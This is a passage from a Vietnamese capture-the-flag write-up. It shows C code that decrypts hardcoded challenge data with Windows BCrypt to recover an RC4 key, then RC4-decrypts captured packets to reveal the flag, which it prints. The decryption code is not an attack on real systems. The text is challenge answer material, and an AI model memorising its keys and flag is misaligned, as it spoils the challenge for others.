    if (BCryptDecrypt(phKey, pbInput, cbInput, NULL, pbIV, 16, (PUCHAR)encryptedData, cbOutput, &cbOutput, 0) != 0) {
        fprintf(stderr, "Failed to encrypt data\n");
        goto cleanup;
    }

    // Copy encrypted data to the output buffer
    memcpy(outputBuffer, encryptedData, cbOutput);
    *outputSize = cbOutput;
    status = 0;

cleanup:
    if (encryptedData) {
        HeapFree(GetProcessHeap(), 0, encryptedData);
    }
    if (keyObject) {
        HeapFree(GetProcessHeap(), 0, keyObject);
    }
    if (phKey) {
        BCryptDestroyKey(phKey);
    }
    if (phAlgorithm) {
        BCryptCloseAlgorithmProvider(phAlgorithm, 0);
    }

    return status;
}

int main() {

    UCHAR secret[48] = { 0xDB, 0x9F, 0x47, 0xE5, 0xFF, 0xC2, 0x75, 0xD7, 0xF4, 0xC3, 0x17, 0x46, 0xE8, 0x67, 0xEC, 0xC5, 0xAF, 0x81, 0x8B, 0x60, 0xB9, 0x16, 0xF7, 0xDD, 0x41, 0xBF, 0x73, 0x41, 0xC8, 0x4F, 0x97, 0x96, 0xC2, 0xB6, 0xA4, 0xEC, 0x8F, 0x25, 0x15, 0x9E, 0xAC, 0x73, 0x76, 0xD6, 0x2B, 0xC0, 0x79, 0x53, };
    UCHAR cyphertext[] = { 0xe8, 0xeb, 0x6b, 0x62, 0x8b, 0x44, 0x13, 0xb6,
0xa7, 0x4c, 0x16, 0x97, 0x28, 0x50, 0xa3, 0xa6,
0xe6, 0xd8, 0xbf, 0x5f, 0x70, 0x16, 0x21, 0xe2,
0x88, 0x8b, 0x79, 0x8b, 0x0e, 0xbd, 0x2d, 0x89 };
    ULONG plainTextLength = sizeof(cyphertext);
    UCHAR outputBuffer[1041] = { 0 };
    ULONG outputSize = 0;

    if (EncryptData(secret, cyphertext, plainTextLength, outputBuffer, &outputSize) == 0) {
        printf("Encryption successful! Encrypted data size: %lu\n", outputSize);

        for (int i = 0; i < sizeof(cyphertext); i++) {
            printf("%c", outputBuffer[i]);
        }
    }
    else {
        printf("Encryption failed!\n");
    }

    return 0;
}

```
- Ta thu được kết quả là `Th!s_1s_R34l_K3y_f0r_Rc4_D3crypt` và cũng chính là thứ cần tìm tiếp theo (RC4 key), bây giờ ta chỉ cần đem các packet còn lại đi decrypt với RC4 là xong

![image](https://github.com/user-attachments/assets/6954b537-686c-425a-8177-cba56e62e2ee)

![image](https://github.com/user-attachments/assets/955c135d-8f1b-4663-8569-793c22afc9f2)

## Script and Flag
```C
#include <stdio.h>
#include <string.h>
#include <stdint.h>


void ksa(const uint8_t* key, int key_length, uint8_t* S) {
    int i, j = 0;
    uint8_t temp;

 
    for (i = 0; i < 256; i++) {
        S[i] = i;
    }

  
    for (i = 0; i < 256; i++) {
        j = (j + S[i] + key[i % key_length]) % 256;
        temp = S[i];
        S[i] = S[j];
        S[j] = temp;
    }
}

void prga(const uint8_t* input, uint8_t* output, int length, uint8_t* S) {
    int i = 0, j = 0, k, t;
    uint8_t temp;

    for (k = 0; k < length; k++) {
    
        i = (i + 1) % 256;
        j = (j + S[i]) % 256;

       
        temp = S[i];
        S[i] = S[j];
        S[j] = temp;

       
        t = (S[i] + S[j]) % 256;
        uint8_t keystream_byte = S[t];

   
        output[k] = input[k] ^ keystream_byte;
    }
}
void rc4_decrypt(const unsigned char* key, const uint8_t* cyphertext, uint8_t* plaintext, int length) {
    uint8_t S[256];
    int key_length = strlen((const char*)key);


    ksa(key, key_length, S);

 
    prga(cyphertext, plaintext, length, S);
}

int main() {
    unsigned char key[] = { 0x54, 0x68, 0x21, 0x73, 0x5F, 0x31, 0x73, 0x5F, 0x52, 0x33, 0x34, 0x6C, 0x5F, 0x4B, 0x33, 0x79, 0x5F, 0x66, 0x30, 0x72, 0x5F, 0x52, 0x63, 0x34, 0x5F, 0x44, 0x33, 0x63, 0x72, 0x79, 0x70, 0x74, };
    unsigned char cyphertext[] = { 0x4f, 0x33, 0xd6, 0xb6, 0xdb, 0x5f, 0x48, 0x2e,
0xd6, 0x6c, 0x77, 0x5f, 0x53, 0x39, 0xd5, 0x45,
0x7d, 0x8f, 0xb8, 0xc7, 0x45, 0xfa, 0x79, 0xdc,
0x87, 0xc0, 0x9f, 0x41, 0xe4, 0x76, 0xe8, 0xba,
0x8a, 0xbc, 0xb0, 0x7f };
size_t cyphertext_length = sizeof(cyphertext);
    uint8_t plaintext[1024] = { 0 }; 


    rc4_decrypt(key, cyphertext, plaintext, cyphertext_length);

    for (int i = 0; i < sizeof(plaintext); i++) {
        printf("%c", plaintext[i]);
    }

    return 0;
}

```
**Flag:** `KCSC{The_Truth_Lies_Beyond_The_Code}`
